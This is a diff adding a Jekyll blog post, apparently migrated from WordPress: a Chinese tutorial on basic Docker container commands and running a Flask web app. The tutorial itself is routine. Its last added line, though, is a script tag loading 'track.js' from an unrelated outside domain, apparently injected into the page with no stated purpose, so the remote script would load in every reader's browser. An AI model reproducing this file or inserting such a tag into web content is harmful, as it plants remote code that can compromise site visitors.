@@ -1,0 +1,204 @@
+---
+layout: post
+title: Docker 容器使用
+date: 2021-06-04 11:09:15.000000000 +08:00
+type: post
+parent_id: '0'
+published: true
+password: ''
+status: publish
+categories:
+- Docker
+tags: []
+meta:
+  blocksy_post_meta_options: a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}
+author:
+  login: gavin
+  email: 519077334@qq.com
+  display_name: gavin
+  first_name: ''
+  last_name: ''
+permalink: "/index.php/2021/06/04/docker-%e5%ae%b9%e5%99%a8%e4%bd%bf%e7%94%a8/"
+---
+<h2>容器使用</h2>
+<h3>获取镜像</h3>
+<p>如果我们本地没有 ubuntu 镜像，我们可以使用 docker pull 命令来载入 ubuntu 镜像：</p>
+<pre class="prettyprint prettyprinted"><span class="pln">$ docker pull ubuntu</span></pre>
+<h3>启动容器</h3>
+<p>以下命令使用 ubuntu 镜像启动一个容器，参数为以命令行模式进入该容器：</p>
+<pre class="prettyprint prettyprinted"><span class="pln">$ docker run </span><span class="pun">-</span><span class="pln">it ubuntu </span><span class="pun">/</span><span class="pln">bin</span><span class="pun">/</span><span class="pln">bash</span></pre>
+<p><img src="{{ site.baseurl }}/wp-content/uploads/2021/06/docker-container-run.png" /></p>
+<p>参数说明：</p>
+<ul>
+<li><strong>-i</strong>: 交互式操作。</li>
+<li><strong>-t</strong>: 终端。</li>
+<li><strong>ubuntu</strong>: ubuntu 镜像。</li>
+<li><strong>/bin/bash</strong>：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 /bin/bash。</li>
+</ul>
+<p>要退出终端，直接输入 <strong>exit</strong>:</p>
+<pre class="prettyprint prettyprinted"><span class="pln">root@ed09e4490c57</span><span class="pun">:/#</span> <span class="kwd">exit</span></pre>
+<p><img src="{{ site.baseurl }}/wp-content/uploads/2021/06/docker-container-exit.png" /></p>
+<h3>启动已停止运行的容器</h3>
+<p>查看所有的容器命令如下：</p>
+<pre class="prettyprint prettyprinted"><span class="pln">$ docker ps </span><span class="pun">-</span><span class="pln">a</span></pre>
+<p>点击图片查看大图：</p>
+<p><a href="https://www.runoob.com/wp-content/uploads/2016/05/docker-container-psa.png" target="_blank" rel="noopener noreferrer"><img src="{{ site.baseurl }}/wp-content/uploads/2021/06/docker-container-psa.png" /></a></p>
+<p>使用 docker start 启动一个已停止的容器：</p>
+<pre class="prettyprint prettyprinted"><span class="pln">$ docker start b750bbbcfd88 </span></pre>
+<p><img src="{{ site.baseurl }}/wp-content/uploads/2021/06/docker-container-start.png" /></p>
+<h3>后台运行</h3>
+<p>在大部分的场景下，我们希望 docker 的服务是在后台运行的，我们可以过 <span class="marked">-d</span> 指定容器的运行模式。</p>
+<pre class="prettyprint prettyprinted"><span class="pln">$ docker run </span><span class="pun">-</span><span class="pln">itd </span><span class="pun">--</span><span class="pln">name ubuntu</span><span class="pun">-</span><span class="pln">test ubuntu </span><span class="pun">/</span><span class="pln">bin</span><span class="pun">/</span><span class="pln">bash</span></pre>
+<p>点击图片查看大图：</p>
+<p><a href="https://www.runoob.com/wp-content/uploads/2016/05/docker-run-d.png" target="_blank" rel="noopener noreferrer"><img src="{{ site.baseurl }}/wp-content/uploads/2021/06/docker-run-d.png" /></a></p>
+<p><a href="https://www.runoob.com/wp-content/uploads/2016/05/docker-run-d2.png" target="_blank" rel="noopener noreferrer"><img src="{{ site.baseurl }}/wp-content/uploads/2021/06/docker-run-d2.png" /></a></p>
+<p><strong>注：</strong>加了 <span class="marked">-d</span> 参数默认不会进入容器，想要进入容器需要使用指令<strong> docker exec</strong>（下面会介绍到）。</p>
+<h3>停止一个容器</h3>
+<p>停止容器的命令如下：</p>
+<pre class="prettyprint prettyprinted"><span class="pln">$ docker stop </span><span class="pun">&lt;容器</span><span class="pln"> ID</span><span class="pun">&gt;</span></pre>
+<p><img src="{{ site.baseurl }}/wp-content/uploads/2021/06/docker-stop-1.png" /></p>
+<p>停止的容器可以通过 docker restart 重启：</p>
+<pre class="prettyprint prettyprinted"><span class="pln">$ docker restart </span><span class="pun">&lt;容器</span><span class="pln"> ID</span><span class="pun">&gt;</span></pre>
+<p><img src="{{ site.baseurl }}/wp-content/uploads/2021/06/docker-stop-2.png" /></p>
+<h3>进入容器</h3>
+<p>在使用 <strong>-d</strong> 参数时，容器启动后会进入后台。此时想要进入容器，可以通过以下指令进入：</p>
+<ul>
+<li><strong>docker attach</strong></li>
+<li><strong>docker exec</strong>：推荐大家使用 docker exec 命令，因为此退出容器终端，不会导致容器的停止。</li>
+</ul>
+<p><strong>attach 命令</strong></p>
+<p>下面演示了使用 docker attach 命令。</p>
+<pre class="prettyprint prettyprinted"><span class="pln">$ docker attach </span><span class="lit">1e560fca3906</span></pre>
+<p><a href="https://www.runoob.com/wp-content/uploads/2016/05/docker-attach.png" target="_blank" rel="noopener noreferrer"><img src="{{ site.baseurl }}/wp-content/uploads/2021/06/docker-attach.png" /></a></p>
+<p><strong>注意：</strong> 如果从这个容器退出，会导致容器的停止。</p>
+<p><strong>exec 命令</strong></p>
+<p>下面演示了使用 docker exec 命令。</p>
+<pre class="prettyprint prettyprinted"><span class="pln">docker </span><span class="kwd">exec</span> <span class="pun">-</span><span class="pln">it </span><span class="lit">243c32535da7</span> <span class="pun">/</span><span class="pln">bin</span><span class="pun">/</span><span class="pln">bash</span></pre>
+<p><a href="https://www.runoob.com/wp-content/uploads/2016/05/docker-exec.png" target="_blank" rel="noopener noreferrer"><img src="{{ site.baseurl }}/wp-content/uploads/2021/06/docker-exec.png" /></a></p>
+<p><strong>注意：</strong> 如果从这个容器退出，容器不会停止，这就是为什么推荐大家使用 <strong>docker exec</strong> 的原因。</p>
+<p>更多参数说明请使用 <span class="marked">docker exec --help</span> 命令查看。</p>
+<h3>导出和导入容器</h3>
+<p><strong>导出容器</strong></p>
+<p>如果要导出本地某个容器，可以使用 <strong>docker export</strong> 命令。</p>
+<pre class="prettyprint prettyprinted"><span class="pln">$ docker </span><span class="kwd">export</span> <span class="lit">1e560fca3906</span> <span class="pun">&gt;</span><span class="pln"> ubuntu</span><span class="pun">.</span><span class="pln">tar</span></pre>
+<p>导出容器 1e560fca3906 快照到本地文件 ubuntu.tar。</p>
+<p><a href="https://www.runoob.com/wp-content/uploads/2016/05/docker-export.png" target="_blank" rel="noopener noreferrer"><img src="{{ site.baseurl }}/wp-content/uploads/2021/06/docker-export.png" /></a></p>
+<p>这样将导出容器快照到本地文件。</p>
+<p><strong>导入容器快照</strong></p>
+<p>可以使用 docker import 从容器快照文件中再导入为镜像，以下实例将快照文件 ubuntu.tar 导入到镜像 test/ubuntu:v1:</p>
+<pre class="prettyprint prettyprinted"><span class="pln">$ cat docker</span><span class="pun">/</span><span class="pln">ubuntu</span><span class="pun">.</span><span class="pln">tar </span><span class="pun">|</span><span class="pln"> docker </span><span class="kwd">import</span> <span class="pun">-</span><span class="pln"> test</span><span class="pun">/</span><span class="pln">ubuntu</span><span class="pun">:</span><span class="pln">v1</span></pre>
+<p><a href="https://www.runoob.com/wp-content/uploads/2016/05/docker-import.png" target="_blank" rel="noopener noreferrer"><img src="{{ site.baseurl }}/wp-content/uploads/2021/06/docker-import.png" /></a></p>
+<p>此外，也可以通过指定 URL 或者某个目录来导入，例如：</p>
+<pre class="prettyprint prettyprinted"><span class="pln">$ docker </span><span class="kwd">import</span><span class="pln"> http</span><span class="pun">:</span><span class="com">//example.com/exampleimage.tgz example/imagerepo</span></pre>
+<h3>删除容器</h3>
+<p>删除容器使用 <strong>docker rm</strong> 命令：</p>
+<pre class="prettyprint prettyprinted"><span class="pln">$ docker rm </span><span class="pun">-</span><span class="pln">f </span><span class="lit">1e560fca3906</span></pre>
+<p><a href="https://www.runoob.com/wp-content/uploads/2016/05/docker-container-rmi.png" target="_blank" rel="noopener noreferrer"><img src="{{ site.baseurl }}/wp-content/uploads/2021/06/docker-container-rmi.png" /></a></p>
+<p>下面的命令可以清理掉所有处于终止状态的容器。</p>
+<p>$ docker container prune</p>
+<hr />
+<h2>运行一个 web 应用</h2>
+<p>前面我们运行的容器并没有一些什么特别的用处。</p>
+<p>接下来让我们尝试使用 docker 构建一个 web 应用程序。</p>
+<p>我们将在docker容器中运行一个 Python Flask 应用来运行一个web应用。</p>
+<pre class="prettyprint prettyprinted"><span class="pln">runoob@runoob</span><span class="pun">:~#</span><span class="pln"> docker pull training</span><span class="pun">/</span><span class="pln">webapp  </span><span class="com"># 载入镜像</span><span class="pln">
+runoob@runoob</span><span class="pun">:~#</span><span class="pln"> docker run </span><span class="pun">-</span><span class="pln">d </span><span class="pun">-</span><span class="pln">P training</span><span class="pun">/</span><span class="pln">webapp python app</span><span class="pun">.</span><span class="pln">py</span></pre>
+<p><img src="{{ site.baseurl }}/wp-content/uploads/2021/06/docker29.png" /></p>
+<p>参数说明:</p>
+<ul>
+<li><strong>-d:</strong>让容器在后台运行。</li>
+<li><strong>-P:</strong>将容器内部使用的网络端口随机映射到我们使用的主机上。</li>
+</ul>
+<hr />
+<h2>查看 WEB 应用容器</h2>
+<p>使用 docker ps 来查看我们正在运行的容器：</p>
+<pre class="prettyprint prettyprinted"><span class="pln">runoob@runoob</span><span class="pun">:~#</span><span class="pln">  docker ps
+CONTAINER ID        IMAGE               COMMAND             </span><span class="pun">...</span><span class="pln">        PORTS                 
+d3d5e39ed9d3        training</span><span class="pun">/</span><span class="pln">webapp     </span><span class="str">"python app.py"</span>     <span class="pun">...</span>        <span class="lit">0.0</span><span class="pun">.</span><span class="lit">0.0</span><span class="pun">:</span><span class="lit">32769</span><span class="pun">-&gt;</span><span class="lit">5000</span><span class="pun">/</span><span class="pln">tcp</span></pre>
+<p>这里多了端口信息。</p>
+<pre class="prettyprint prettyprinted"><span class="pln">PORTS
+</span><span class="lit">0.0</span><span class="pun">.</span><span class="lit">0.0</span><span class="pun">:</span><span class="lit">32769</span><span class="pun">-&gt;</span><span class="lit">5000</span><span class="pun">/</span><span class="pln">tcp</span></pre>
+<p>Docker 开放了 5000 端口（默认 Python Flask 端口）映射到主机端口 32769 上。</p>
+<p>这时我们可以通过浏览器访问WEB应用</p>
+<p><img src="{{ site.baseurl }}/wp-content/uploads/2021/06/docker31.png" /></p>
+<p>我们也可以通过 -p 参数来设置不一样的端口：</p>
+<pre class="prettyprint prettyprinted"><span class="pln">runoob@runoob</span><span class="pun">:~</span><span class="pln">$ docker run </span><span class="pun">-</span><span class="pln">d </span><span class="pun">-</span><span class="pln">p </span><span class="lit">5000</span><span class="pun">:</span><span class="lit">5000</span><span class="pln"> training</span><span class="pun">/</span><span class="pln">webapp python app</span><span class="pun">.</span><span class="pln">py</span></pre>
+<p><strong>docker ps</strong>查看正在运行的容器</p>
+<pre class="prettyprint prettyprinted"><span class="pln">runoob@runoob</span><span class="pun">:~#</span><span class="pln">  docker ps
+CONTAINER ID        IMAGE                             PORTS                     NAMES
+bf08b7f2cd89        training</span><span class="pun">/</span><span class="pln">webapp     </span><span class="pun">...</span>        <span class="lit">0.0</span><span class="pun">.</span><span class="lit">0.0</span><span class="pun">:</span><span class="lit">5000</span><span class="pun">-&gt;</span><span class="lit">5000</span><span class="pun">/</span><span class="pln">tcp    wizardly_chandrasekhar
+d3d5e39ed9d3        training</span><span class="pun">/</span><span class="pln">webapp     </span><span class="pun">...</span>        <span class="lit">0.0</span><span class="pun">.</span><span class="lit">0.0</span><span class="pun">:</span><span class="lit">32769</span><span class="pun">-&gt;</span><span class="lit">5000</span><span class="pun">/</span><span class="pln">tcp   xenodochial_hoov</span></pre>
+<p>容器内部的 5000 端口映射到我们本地主机的 5000 端口上。</p>
+<hr />
+<h2>网络端口的快捷方式</h2>
+<p>通过 <strong>docker ps</strong> 命令可以查看到容器的端口映射，<strong>docker</strong> 还提供了另一个快捷方式 <strong>docker port</strong>，使用 <strong>docker port</strong> 可以查看指定 （ID 或者名字）容器的某个确定端口映射到宿主机的端口号。</p>
+<p>上面我们创建的 web 应用容器 ID 为 <strong>bf08b7f2cd89</strong> 名字为 <strong>wizardly_chandrasekhar</strong>。</p>
+<p>我可以使用 <span class="marked">docker port bf08b7f2cd89</span> 或 <span class="marked">docker port wizardly_chandrasekhar</span> 来查看容器端口的映射情况。</p>
+<pre class="prettyprint prettyprinted"><span class="pln">runoob@runoob</span><span class="pun">:~</span><span class="pln">$ docker port bf08b7f2cd89
+</span><span class="lit">5000</span><span class="pun">/</span><span class="pln">tcp </span><span class="pun">-&gt;</span> <span class="lit">0.0</span><span class="pun">.</span><span class="lit">0.0</span><span class="pun">:</span><span class="lit">5000</span></pre>
+<pre class="prettyprint prettyprinted"><span class="pln">runoob@runoob</span><span class="pun">:~</span><span class="pln">$ docker port wizardly_chandrasekhar
+</span><span class="lit">5000</span><span class="pun">/</span><span class="pln">tcp </span><span class="pun">-&gt;</span> <span class="lit">0.0</span><span class="pun">.</span><span class="lit">0.0</span><span class="pun">:</span><span class="lit">5000</span></pre>
+<hr />
+<h2>查看 WEB 应用程序日志</h2>
+<p>docker logs [ID或者名字] 可以查看容器内部的标准输出。</p>
+<pre class="prettyprint prettyprinted"><span class="pln">runoob@runoob</span><span class="pun">:~</span><span class="pln">$ docker logs </span><span class="pun">-</span><span class="pln">f bf08b7f2cd89
+ </span><span class="pun">*</span> <span class="typ">Running</span><span class="pln"> on http</span><span class="pun">:</span><span class="com">//0.0.0.0:5000/ (Press CTRL+C to quit)</span>
+<span class="lit">192.168</span><span class="pun">.</span><span class="lit">239.1</span> <span class="pun">-</span> <span class="pun">-</span> <span class="pun">[</span><span class="lit">09</span><span class="pun">/</span><span class="typ">May</span><span class="pun">/</span><span class="lit">2016</span> <span class="lit">16</span><span class="pun">:</span><span class="lit">30</span><span class="pun">:</span><span class="lit">37</span><span class="pun">]</span> <span class="str">"GET / HTTP/1.1"</span> <span class="lit">200</span> <span class="pun">-</span>
+<span class="lit">192.168</span><span class="pun">.</span><span class="lit">239.1</span> <span class="pun">-</span> <span class="pun">-</span> <span class="pun">[</span><span class="lit">09</span><span class="pun">/</span><span class="typ">May</span><span class="pun">/</span><span class="lit">2016</span> <span class="lit">16</span><span class="pun">:</span><span class="lit">30</span><span class="pun">:</span><span class="lit">37</span><span class="pun">]</span> <span class="str">"GET /favicon.ico HTTP/1.1"</span> <span class="lit">404</span> <span class="pun">-</span></pre>
+<p><strong>-f:</strong> 让 <strong>docker logs</strong> 像使用 <strong>tail -f</strong> 一样来输出容器内部的标准输出。</p>
+<p>从上面，我们可以看到应用程序使用的是 5000 端口并且能够查看到应用程序的访问日志。</p>
+<hr />
+<h2>查看WEB应用程序容器的进程</h2>
+<p>我们还可以使用 docker top 来查看容器内部运行的进程</p>
+<pre class="prettyprint prettyprinted"><span class="pln">runoob@runoob</span><span class="pun">:~</span><span class="pln">$ docker top wizardly_chandrasekhar
+UID     PID         PPID          </span><span class="pun">...</span><span class="pln">       TIME                CMD
+root    </span><span class="lit">23245</span>       <span class="lit">23228</span>         <span class="pun">...</span>       <span class="lit">00</span><span class="pun">:</span><span class="lit">00</span><span class="pun">:</span><span class="lit">00</span><span class="pln">            python app</span><span class="pun">.</span><span class="pln">py</span></pre>
+<hr />
+<h2>检查 WEB 应用程序</h2>
+<p>使用 <strong>docker inspect</strong> 来查看 Docker 的底层信息。它会返回一个 JSON 文件记录着 Docker 容器的配置和状态信息。</p>
+<pre class="prettyprint prettyprinted"><span class="pln">runoob@runoob</span><span class="pun">:~</span><span class="pln">$ docker inspect wizardly_chandrasekhar
+</span><span class="pun">[</span>
+    <span class="pun">{</span>
+        <span class="str">"Id"</span><span class="pun">:</span> <span class="str">"bf08b7f2cd897b5964943134aa6d373e355c286db9b9885b1f60b6e8f82b2b85"</span><span class="pun">,</span>
+        <span class="str">"Created"</span><span class="pun">:</span> <span class="str">"2018-09-17T01:41:26.174228707Z"</span><span class="pun">,</span>
+        <span class="str">"Path"</span><span class="pun">:</span> <span class="str">"python"</span><span class="pun">,</span>
+        <span class="str">"Args"</span><span class="pun">:</span> <span class="pun">[</span>
+            <span class="str">"app.py"</span>
+        <span class="pun">],</span>
+        <span class="str">"State"</span><span class="pun">:</span> <span class="pun">{</span>
+            <span class="str">"Status"</span><span class="pun">:</span> <span class="str">"running"</span><span class="pun">,</span>
+            <span class="str">"Running"</span><span class="pun">:</span> <span class="kwd">true</span><span class="pun">,</span>
+            <span class="str">"Paused"</span><span class="pun">:</span> <span class="kwd">false</span><span class="pun">,</span>
+            <span class="str">"Restarting"</span><span class="pun">:</span> <span class="kwd">false</span><span class="pun">,</span>
+            <span class="str">"OOMKilled"</span><span class="pun">:</span> <span class="kwd">false</span><span class="pun">,</span>
+            <span class="str">"Dead"</span><span class="pun">:</span> <span class="kwd">false</span><span class="pun">,</span>
+            <span class="str">"Pid"</span><span class="pun">:</span> <span class="lit">23245</span><span class="pun">,</span>
+            <span class="str">"ExitCode"</span><span class="pun">:</span> <span class="lit">0</span><span class="pun">,</span>
+            <span class="str">"Error"</span><span class="pun">:</span> <span class="str">""</span><span class="pun">,</span>
+            <span class="str">"StartedAt"</span><span class="pun">:</span> <span class="str">"2018-09-17T01:41:26.494185806Z"</span><span class="pun">,</span>
+            <span class="str">"FinishedAt"</span><span class="pun">:</span> <span class="str">"0001-01-01T00:00:00Z"</span>
+        <span class="pun">},</span>
+<span class="pun">......</span></pre>
+<hr />
+<h2>停止 WEB 应用容器</h2>
+<pre class="prettyprint prettyprinted"><span class="pln">runoob@runoob</span><span class="pun">:~</span><span class="pln">$ docker stop wizardly_chandrasekhar   
+wizardly_chandrasekhar</span></pre>
+<hr />
+<h2>重启WEB应用容器</h2>
+<p>已经停止的容器，我们可以使用命令 docker start 来启动。</p>
+<pre class="prettyprint prettyprinted"><span class="pln">runoob@runoob</span><span class="pun">:~</span><span class="pln">$ docker start wizardly_chandrasekhar
+wizardly_chandrasekhar</span></pre>
+<p>docker ps -l 查询最后一次创建的容器：</p>
+<pre class="prettyprint prettyprinted"><span class="com">#  docker ps -l </span><span class="pln">
+CONTAINER ID        IMAGE                             PORTS                     NAMES
+bf08b7f2cd89        training</span><span class="pun">/</span><span class="pln">webapp     </span><span class="pun">...</span>        <span class="lit">0.0</span><span class="pun">.</span><span class="lit">0.0</span><span class="pun">:</span><span class="lit">5000</span><span class="pun">-&gt;</span><span class="lit">5000</span><span class="pun">/</span><span class="pln">tcp    wizardly_chandrasekhar</span></pre>
+<p>正在运行的容器，我们可以使用 <span class="marked">docker restart</span> 命令来重启。</p>
+<hr />
+<h2>移除WEB应用容器</h2>
+<p>我们可以使用 docker rm 命令来删除不需要的容器</p>
+<pre class="prettyprint prettyprinted"><span class="pln">runoob@runoob</span><span class="pun">:~</span><span class="pln">$ docker rm wizardly_chandrasekhar  
+wizardly_chandrasekhar</span></pre>
+<p>删除容器时，容器必须是停止状态，否则会报如下错误</p>
+<pre class="prettyprint prettyprinted"><span class="pln">runoob@runoob</span><span class="pun">:~</span><span class="pln">$ docker rm wizardly_chandrasekhar
+</span><span class="typ">Error</span><span class="pln"> response </span><span class="kwd">from</span><span class="pln"> daemon</span><span class="pun">:</span> <span class="typ">You</span><span class="pln"> cannot remove a running container bf08b7f2cd897b5964943134aa6d373e355c286db9b9885b1f60b6e8f82b2b85</span><span class="pun">.</span> <span class="typ">Stop</span><span class="pln"> the container before attempting removal </span><span class="kwd">or</span><span class="pln"> force remove</span></pre>
+<p><script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script></p>
